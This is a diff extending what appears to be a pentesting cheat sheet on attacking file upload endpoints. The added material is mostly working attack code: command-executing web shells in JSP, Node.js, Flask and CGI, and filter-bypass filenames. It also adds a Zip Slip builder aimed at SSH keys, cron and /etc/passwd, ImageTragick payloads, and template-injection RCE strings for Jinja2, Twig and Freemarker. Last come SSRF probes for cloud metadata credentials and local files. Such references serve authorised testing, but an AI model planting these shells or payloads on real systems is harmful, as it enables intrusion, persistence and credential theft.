@@ -15,9 +15,9 @@ File upload endpoints that fail to validate file type, content, or name allow at
 | `ffuf` / `Burp Intruder` | Fuzz extensions, content-types, filenames |
 | `Burp Suite` | Intercept and modify upload requests |
 | `Turbo Intruder` | Race condition exploitation |
-| `exiftool` | Inject payloads into image EXIF metadata |
+| `exiftool` | Inject payloads into EXIF metadata / embed PHP in images |
 | `file` | Check magic bytes of a file |
-| `ExifTool` / `hexedit` | Embed PHP/polyglot into image headers |
+| `hexedit` | Manually edit binary file headers to inject payloads |
 
 ---
 
@@ -69,7 +69,57 @@ Resources:
 ### JSP (Java/Tomcat)
 
 ```jsp
-<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+<%@ page import="java.io.*" %>
+<%
+    String cmd = request.getParameter("cmd");
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while ((line = br.readLine()) != null) { out.println(line + "<br>"); }
+%>
+```
+
+### Node.js (Express)
+
+```javascript
+// shell.js — requires express installed on the target
+const {exec} = require('child_process');
+app.get('/shell', (req, res) => {
+    exec(req.query.cmd, (err, stdout) => res.send(stdout));
+});
+```
+
+Or as a standalone file if Node is available:
+```javascript
+// run: node shell.js
+require('http').createServer((req,res)=>{
+    require('child_process').exec(
+        require('url').parse(req.url,true).query.cmd,
+        (_,o)=>res.end(o)
+    );
+}).listen(9999);
+```
+
+### Python (Flask / CGI)
+
+```python
+# Flask
+from flask import Flask,request
+import subprocess
+app=Flask(__name__)
+@app.route('/shell')
+def shell():
+    return subprocess.check_output(request.args.get('cmd'),shell=True)
+```
+
+```python
+# CGI — save as shell.py in cgi-bin/
+#!/usr/bin/env python3
+import cgi, subprocess
+print("Content-Type: text/html\n")
+form = cgi.FieldStorage()
+cmd = form.getvalue('cmd','id')
+print(subprocess.check_output(cmd,shell=True).decode())
 ```
 
 ---
@@ -133,6 +183,26 @@ Server blocks specific extensions (`.php`, `.asp`, etc.) — try alternatives.
 .asp .aspx .config .cer .asa .asax .ascx .ashx .axd .asmx
 ```
 
+### Case Sensitivity Bypass
+
+Filters doing string comparison without `.toLowerCase()` miss mixed-case variants:
+
+```
+shell.PHP   shell.Php   shell.pHp   shell.PhP
+shell.ASP   shell.Asp   shell.ASPX  shell.Aspx
+```
+
+Generate mixed-case wordlist:
+```bash
+# Python one-liner — all case permutations of "php"
+python3 -c "
+from itertools import product
+ext = 'php'
+perms = [''.join(c) for c in product(*[(ch.lower(), ch.upper()) for ch in ext])]
+[print(f'shell.{p}') for p in perms]
+" > case_wordlist.txt
+```
+
 ### Fuzz extensions with ffuf
 
 ```bash
@@ -170,6 +240,22 @@ Server only allows specific extensions — trick it into accepting executable fi
 shell.jpg.php     → if server stops at first extension (jpg)
 shell.php.jpg     → if server executes on first extension, ignores last
 shell.php%00.jpg  → null byte — truncates at %00 (older PHP/servers)
+```
+
+### Filename Length Truncation
+
+Some backends truncate filenames at a fixed length (e.g., 255 bytes). If the filter validates the full string but the OS stores only the first N chars, pad with junk to push the allowed extension out of range:
+
+```
+# If max filename ~255 bytes, the .jpg gets truncated, leaving .php
+shell.php[AAA...255 chars total].jpg
+```
+
+```bash
+# Generate a padded filename (255-char limit example)
+python3 -c "print('shell.php' + 'A'*241 + '.jpg')"
+# → shell.phpAAAAAAAAAAAAAAAA...AAAA.jpg  (255 chars)
+# Server validates "...AAAA.jpg", truncates on disk to "shell.phpAAAA..." → executes as PHP
 ```
 
 ### Character Injection
@@ -470,6 +556,80 @@ Workflow:
 
 ---
 
+## Zip Slip (Path Traversal via Archive)
+
+If the application extracts zip/tar archives, filenames inside the archive can contain path traversal sequences. The server extracts the file outside the intended directory — can overwrite arbitrary files.
+
+```bash
+# Create a malicious zip with path traversal filename
+# Method 1: evilarc (python tool)
+pip install evilarc
+evilarc shell.php -o zip -d 6 -p /var/www/html/
+
+# Method 2: manual with Python
+python3 -c "
+import zipfile
+with zipfile.ZipFile('evil.zip','w') as z:
+    z.write('shell.php', '../../var/www/html/shell.php')
+"
+
+# Method 3: using zip with --junk-paths bypass
+zip evil.zip shell.php
+# Then rename the entry inside with zipinfo/hexedit
+```
+
+Targets to overwrite:
+```
+/var/www/html/shell.php       → web root (RCE)
+/etc/cron.d/backdoor          → cron job
+~/.ssh/authorized_keys        → SSH persistence
+/etc/passwd                   → overwrite with custom root entry
+```
+
+---
+
+## ImageMagick — ImageTragick (CVE-2016-3714)
+
+If the server uses ImageMagick to process/resize uploaded images, it may be vulnerable to command injection via crafted image files.
+
+```bash
+# Check if ImageMagick is in use (look for convert/identify calls in errors/headers)
+# Version < 6.9.3-9 is vulnerable
+
+# Method 1: MVG polyglot payload (most common)
+cat > exploit.mvg << 'EOF'
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|id; ")'
+pop graphic-context
+EOF
+
+# Method 2: .jpg disguised as MVG
+# Prepend JPEG magic bytes and save as exploit.jpg — server processes it as image
+
+# Method 3: .svg with ImageMagick delegate
+cat > exploit.svg << 'EOF'
+<image authenticate='ff" `id > /tmp/pwned`;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg">
+    <image xlink:href="msl:exploit.svg" height="100" width="100"/>
+  </svg>
+</image>
+EOF
+```
+
+Check for successful execution:
+```bash
+# Look for /tmp/pwned or OOB callback
+curl "http://target.com/uploads/exploit.jpg"
+# Or use a Burp Collaborator/interactsh URL in the payload
+```
+
+---
+
 ## DoS via File Upload
 
 ```bash
@@ -490,6 +650,107 @@ dd if=/dev/urandom of=bigfile.bin bs=1M count=1000
 
 ---
 
+## SSTI via Template Upload
+
+If the application accepts template files and renders them server-side (Jinja2, Twig, Freemarker, etc.), uploading a malicious template leads to SSTI → RCE.
+
+### Identify the engine
+
+| Engine | Probe payload | Expected output |
+|---|---|---|
+| Jinja2 (Python) | `{{7*7}}` | `49` |
+| Twig (PHP) | `{{7*7}}` | `49` |
+| Freemarker (Java) | `${7*7}` | `49` |
+| Mako (Python) | `${7*7}` | `49` |
+| Handlebars (Node) | `{{7*7}}` | (no eval — different bypass) |
+
+### Jinja2 RCE payload
+
+```jinja2
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+```
+
+```jinja2
+{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].decode()}}
+```
+
+### Twig RCE payload
+
+```twig
+{{['id']|filter('system')}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+### Freemarker RCE payload
+
+```freemarker
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+```
+
+### Workflow
+
+```
+1. Upload a template file (e.g., .html, .twig, .j2, .ftl)
+2. If rendered — embed probe payload {{7*7}} or ${7*7}
+3. Identify engine from output or error messages
+4. Escalate with RCE payload
+5. Pivot to reverse shell
+```
+
+---
+
+## Upload from URL (SSRF)
+
+Some upload forms accept a remote URL to fetch the file. The server-side fetch is an SSRF vector.
+
+```
+# Common form field names
+url=  source=  remote=  fetch=  image_url=  download=
+```
+
+### Internal network probe
+
+```bash
+# Cloud metadata
+url=http://169.254.169.254/latest/meta-data/
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Internal services
+url=http://127.0.0.1:80/
+url=http://127.0.0.1:8080/
+url=http://127.0.0.1:6379/        # Redis
+url=http://127.0.0.1:27017/       # MongoDB
+url=http://192.168.1.1/           # Internal router
+
+# File read via file:// (if not filtered)
+url=file:///etc/passwd
+url=file:///var/www/html/config.php
+```
+
+### Filter bypass for SSRF
+
+```
+# IP encoding alternatives for 127.0.0.1
+url=http://0x7f000001/
+url=http://2130706433/
+url=http://127.1/
+url=http://[::1]/
+url=http://localhost/
+
+# DNS rebinding — resolves to external first, then internal on retry
+# Use tools like rebind.it or singularity of origin
+```
+
+### Detect via OOB
+
+```bash
+# Use interactsh or Burp Collaborator
+url=http://<collaborator-url>/test
+# If you get a DNS/HTTP callback → SSRF confirmed
+```
+
+---
+
 ## Checklist
 
 ```
@@ -497,8 +758,10 @@ dd if=/dev/urandom of=bigfile.bin bs=1M count=1000
 [ ] Upload minimal PHP shell directly — check if it executes
 [ ] Client-side bypass: remove JS validation, intercept with Burp
 [ ] Fuzz extensions with web-extensions.txt (blacklist bypass)
+[ ] Try case sensitivity: shell.PHP, shell.Php, shell.pHp
 [ ] Try double extension: shell.jpg.php, shell.php.jpg
 [ ] Try null byte: shell.php%00.jpg
+[ ] Try filename length truncation: shell.php + 241xA + .jpg
 [ ] Generate char injection wordlist and fuzz
 [ ] Change Content-Type to image/jpeg — fuzz full list
 [ ] Add GIF8 magic bytes — check if MIME filter bypassed
@@ -508,4 +771,8 @@ dd if=/dev/urandom of=bigfile.bin bs=1M count=1000
 [ ] Try LFI+upload chain if LFI exists
 [ ] SVG/XXE if image uploads accepted
 [ ] Race condition if validation window exists
+[ ] Zip/tar upload? → test Zip Slip path traversal
+[ ] Image processing on server? → test ImageTragick (MVG/SVG payload)
+[ ] Template files accepted? → test SSTI ({{7*7}}, ${7*7})
+[ ] Upload-from-URL field? → test SSRF (127.0.0.1, metadata, file://)
 ```
